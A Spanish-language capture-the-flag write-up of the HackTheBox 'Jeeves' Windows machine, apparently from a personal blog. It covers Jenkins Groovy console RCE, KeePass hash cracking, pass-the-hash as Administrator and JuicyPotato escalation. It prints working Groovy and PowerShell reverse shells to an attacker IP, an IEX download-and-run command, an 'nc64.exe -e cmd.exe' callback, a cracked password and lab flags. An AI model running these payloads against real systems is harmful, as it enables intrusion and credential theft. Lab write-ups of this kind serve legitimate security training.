---
title: "Jeeves Write-UP | HackTheBox"
date: "2021-06-09"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-06-09-jeeves-write-up-hackthebox
image:
   path: header/jeeves_card.webp
   lqip: data:image/webp;base64,UklGRnAAAABXRUJQVlA4IGQAAAAwAwCdASoUAAsAPzmEuVOvKKWisAgB4CcJbAAALRj1aDAAAP6sA/usZR/W/6qd51OAFUlKp9E/E3rqjcYUmQ0oYQJ+4jVNSPC9DKcYc382g9mFNlHb24qBS17uTlP1BkYzAAAA
   
published: true
---

## Descripción

En esta máquina **Jeeves** de la plataforma **Hackthebox** con dificultad "Medium" y OS Windows, haremos uso de comandos en Groovy para obtener reverse shell en la plataforma Jenkins, encontraremos una base de datos del gestor de contraseñas Keepass, el cual tendremos que conseguir la contraseña maestra y tendremos 2 vías alternativas para la escalada de privilegios.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO Windows:

```bash
# ping -c 1 10.129.157.201

PING 10.129.157.200 (10.129.157.200) 56(84) bytes of data.
64 bytes from 10.129.157.200: icmp_seq=1 ttl=127 time=51.3 ms

--- 10.129.157.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 51.271/51.271/51.271/0.000 ms
```

Hacemos uso de la herramienta NMAP para descubrir puertos abiertos:

```bash
# nmap -sS --min-rate 5000 -p- --open -n -Pn -oG allPorts -oN jeeves.initScan 10.129.157.201
Nmap scan report for 10.129.157.201
Host is up (0.060s latency).
Not shown: 65531 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

Observamos que tiene 4 puertos abiertos, corriendo los servicios: **HTTP (80), MSRPC (135), MS-DS (445)** y **IBM-DB2 (50000)**

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos:

```bash
# nmap -sC -sV -p 80,135,445,50000 -n -Pn -v -oN jeeves.services 10.129.157.201
Nmap scan report for 10.129.157.201
Host is up (0.055s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-08T15:33:26
|_  start_date: 2021-06-08T15:25:45
```

Vemos que en el puerto **80** y **50000** están siendo utilizados como servicios Web. Interesante el puerto 50000 con el servicio **Jetty**.

Utilizamos la herramienta **whatweb** para identificar de una pasada los sitios web de los puertos encontrados:

```bash
# whatweb <http://10.129.157.201>
<http://10.129.157.201> [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.157.201], Microsoft-IIS[10.0], Title[Ask Jeeves]

# whatweb <http://10.129.157.201:50000>
<http://10.129.157.201:50000> [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty(9.4.z-SNAPSHOT)], IP[10.129.157.201], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
```

El sitio Web corriendo en el puerto 80, nos muestra el siguiente contenido con un input para realizar búsquedas.

![](body/84ceed45c4b8373db6efdbabebc46fc4fa6950bc.png)

Cuando introducimos cualquier contenido, siempre nos muestra la siguiente imagen. No es un error real de MSSQL, directamente es un rabbithole que nos ha dejado el creador de la máquina:

![](body/73b6a2994a59afc4ed1bdb5759f9594ff819f510.png)

Poca cosa podemos encontrar aquí, ya que ningún enlace funciona.

El sitio web corriendo en el puerto 50000, nos muestra el siguiente contenido, el cual parece sospechoso ya que nos indica que no ha encontrado ningún recurso (HTTP ERROR 404 - Not found):

![](body/158e84326e69f95aa171c008209b65d540a29bd2.png)

Realizamos fuzzing utilizando **GoBuster** para encontrar directorios a base de fuerza bruta en el puerto 50000:

```bash
# gobuster dir -u <http://10.129.157.201:50000/> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.129.157.201:50000/>
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/08 13:03:05 Starting gobuster in directory enumeration mode
===============================================================
/askjeeves            (Status: 302) [Size: 0] [--> <http://10.129.157.201:50000/askjeeves/>]
```

Encontramos un directorio llamado "**askjeeves**".

## Explotación

Accedemos al directorio que hemos encontrado y nos encontramos con el siguiente panel de control:

![](body/8f61595564eaf9cd3e0d319e43d1891ce0ceec59.png)

Vamos a la opción de **Administrar Jenkins** y vemos que tenemos la opción **Consola de scripts**, la cual nos permite ejecutar comandos en **Groovy Script**:

![](body/a2961c9f792ed742b857c2763a4ecd3353f7d650.png)

Vemos que tenemos ejecución remota de comandos (**RCE**):

![](body/a306810c954fb45b5684e1cec0dfde27afc31430.png)

Tenemos 2 vías para obtener Shell, obteniendo shell con CMD u obteniendo shell con Powershell. Vamos a ver las 2 opciones.

### Obteniendo reverse shell con CMD:

```bash
String host="10.10.14.34";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

(Podemos cambiar la variable a "powershell.exe", pero no va a funcionar, no obtendremos una shell completa).

![](body/9e9951dd17046b84f11ae217334a1ef2baece6fb.png)

### Obteniendo reverse shell con Powershell

Para esta opción vamos a utilizar la reverse shell de [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) "Invoke-PowerShellTcp.ps1":

Editamos el PS1, copiamos la siguiente línea y la pegamos al final del archivo, de esta forma se ejecutará una vez invocado el archivo:

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.34 -Port 443
```

Levantamos el servidor http para compartir el archivo PS1 y ejecutamos el siguiente comando en la consola de scripts que hemos visto anteriormente:

```bash
ps = "C:\\Windows\\sysnative\\WindowsPowershell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadString('<http://10.10.14.34/Invoke-PowerShellTcp.ps1>')"
ps.execute()
```

Vemos la petición del recurso en el servidor HTTP:

![](body/072919b60150a702b25495dedb28d0acbec8bd8e.png)

Obtenemos la shell deseada:

![](body/c74dc4ac0cfee80cb4d292e9ea817b6d26db8c60-1.png)

### User Flag

En el directorio Desktop del usuario "**_Kohsuke_**" podemos visualizar la flag de "user".

```bash
PS C:\Users\Kohsuke\Desktop> type user.txt
e3232272596fb47950d59c4cf1e7066a
```

## Escalada de privilegios

Enumeramos un poco el usuario para ver los permisos de los que disponemos:

```bash
PS C:\Users\Kohsuke\Desktop> net user kohsuke
User name                    kohsuke
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/3/2017 9:56:38 PM
Password expires             Never
Password changeable          11/3/2017 9:56:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/8/2021 11:25:45 AM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

No vemos nada fuera de lo normal. Pertenecemos al grupo "**Users**".

```bash
PS C:\Users\Kohsuke\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Bueno..., vemos que tenemos asignado el permiso de "**SeImpersonatePrivilege**". Este permiso nos va a servir para mostrar la vía alternativa de escalada de privilegios. Por ahora vamos a ver el camino intencionado que tiene la máquina para la escalada de privilegios.

Enumeramos las capertas del usuario **_Kohsuke_** y vemos que tiene en el directorio **_Documents_** un archivo con extensión "**kdbx**", se trata de la base de datos local del gestor de contraseñas **Keepass**:

```bash
PS C:\Users\Kohsuke\Desktop> dir
Directory: C:\Users\Kohsuke\Documents

Mode                LastWriteTime         Length Name                                                                  
---- ------------- ------ ---- 
-a---- 9/18/2017   1:43 PM           2846 CEH.kdbx
```

La transferimos a nuestro equipo, en este caso vamos utilizar **impacket-smbserver** para la transferencia:

```bash
# impacket-smbserver smbFolder $(pwd)

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

En la máquina Jeeves:

```bash
PS C:\Users\Kohsuke\Desktop> copy CEH.kdbx \\10.10.14.34\smbFolder\CEH.kdbx
```

Una vez tenemos el archivo en nuestrá máquina, comprobamos de forma rápida que tipo de archivo es:

```bash
# file CEH.kdbx 
CEH.kdbx: Keepass password database 2.x KDBX
```

Abrimos el archivo **CEH.kdbx** con **KeepassXC**:

![](body/1c4dc3c947fcfc0d4c9636f47dea6bca698a28d8.png)

Como vemos, necesitaremos la contraseña maestra que nos permita visualizar los objetos que contiene. Para ello vamos a hacer uso de **JOHN.**

Primero utilizaremos **keepass2john** para obtener el hash del archivo:

```bash
keepass2john CEH.kdbx > hash_keepass | cat
CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Una vez obtenido el hash, pasamos a realizar ataque por diccionario con **John The Ripper**:

```bash
# john --wordlist=/usr/share/wordlists/rockyou.txt hash_keepass

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 6000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:00:17 DONE (2021-06-08 15:38) 0.05558g/s 3056p/s 3056c/s 3056C/s nando1..monkeybum
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Obtenemos la contraseña: **moonshine1**

Abrimos el archivo **CEH.kdbx** e introducimos la contraseña:

![](body/2033ee885cdaf03129f005ceb4efc4813996abb8.png)

El objeto que nos interesa es **Backup stuff**, si visualizamos el campo de contraseña, podemos ver que se trata de un hash **NTLM**:

![](body/6929f03464c732157ff1bf5aa7ec7e987a3a3992.png)

Podemos probar con la herramienta **CrackMapExec** si se trata de un hash válido para los usuarios **_Administrator_** y **_Kohsuke_** realizando user spraying:

```bash
# touch users && echo -e "Administrator\nKohsuke" > users | catn   
Administrator
Kohsuke

# crackmapexec smb 10.129.157.201 -u users -H 'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00' -d WORKGROUP
SMB         10.129.157.201  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:WORKGROUP) (signing:False) (SMBv1:True)
SMB         10.129.157.201  445    JEEVES           [+] WORKGROUP\\Administrator aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 (Pwn3d!)
```

Como vemos, se trata del hash **NTLM** del usuario **Administrador**.

En este punto realizamos PassTheHass para acceder con la cuenta de Administrador, en mi caso utilizo la herramienta **psexec.py,** pero si conocéis otra, la podéis utilizar sin problema:

```bash
psexec.py Administrator@10.129.157.201 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

![](body/2622de9fcad396ef2ff0c75421be0d6df05d3feb.png)

Aquí no termina todo, el creador de la máquina nos ha dejado un pequeño regalo a la hora de mostrar la flag de root.

### Root Flag

Cuando intentamos visualizar la flag, vemos que no obtenemos lo que queremos, si no un texto que nos indica:

```bash
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

Si realizamos un listado con "**dir /r**", nos mostrará que la flag "**root.txt**" se encuentra adherida al archivo **hm.txt**.

Esta técnica o característica se denomina **ADS** (**Alternate Data Stream**), el cual nos permite realizar ocultaciones de archivos, esta es una carácterística de **Windows con sistema de ficheros NTFS**.

```bash
C:\Users\Administrator\Desktop> dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,490,560,000 bytes free
```

Podemos visualizar la flag en el mismo sistema o podemos pasarla a nuestro equipo, yo voy a visualizarla en el propio sistema:

```bash
C:\Users\Administrator\Desktop> more < hm.txt:root.txt                                                                         │
afbc5bd4b615a60648cec41c6ac92530
```

## Escalada de privilegios alternativa con JuicyPotato

Como hemos visto anteriormente, el usuario **Kohsuke** tiene asignado el permiso privilegiado de "**SeImpersonatePrivilege**". Haciendo uso de la herramienta **JuicyPotato** o **RottenPotato**, podemos realizar la escalada de privilegios directamente.

Para ello tenemos que descargar el binario de [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases) y [nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe).

![](body/8973c5d2534f988d7960ecb7b16d64d05caa04ee.png)

Levantamos la caperta compartida con **impacket-smbserver** donde tengamos los recursos descargados:

```bash
# impacket-smbserver smbFolder $(pwd)

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Ponemos **netcat** a la escucha en el puerto 1337 y lanzamos desde la máquina **Jeeves**:

```bash
PS C:\Users\Kohsuke> \\10.10.14.34\smbFolder\JuicyPotato.exe -l 9090 -p cmd.exe -a "/c \\10.10.14.34\smbFolder\nc64.exe -e cmd.exe 10.10.14.34 1337" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 9090
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

(El puerto 9090 es random, es el puerto COM que utilizará JuicyPotato, puedes elegir el que quieras)

Si miramos la sesión de **netcat**, habremos obtenido shell como usuario **SYSTEM**:

![](body/473c3c0665523824907e4cc4a0c5bea3c903da59.png)
